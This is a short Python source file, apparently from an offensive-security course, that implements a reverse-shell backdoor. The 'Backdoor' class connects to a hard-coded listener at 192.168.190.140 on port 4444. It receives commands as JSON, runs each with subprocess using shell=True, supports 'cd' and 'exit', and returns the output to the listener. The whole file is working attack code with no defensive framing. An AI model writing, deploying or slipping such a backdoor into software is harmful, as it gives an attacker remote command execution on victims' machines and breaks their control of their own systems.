import socket
import subprocess
import json
import os


class Backdoor:
    # Set socket
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a instance of the socket
        self.connection.connect((ip, port))

    # Send data as JSON Object
    def reliable_send(self, data):
        json_data = json.dumps(data)  # Serialize data into JSON
        self.connection.send(json_data)  # Sending data to backdoor

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)  # Deserialize JSON data

    # Execute a command and return its output
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: " + path

    # Start the connection to the listener
    def run(self):
        while True:
            command = self.reliable_receive()

            # Incoming command exit
            if command[0] == "exit":
                self.connection.close()
                exit()

            # Incoming command cd with path
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])

            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.190.140", 4444)
my_backdoor.run()
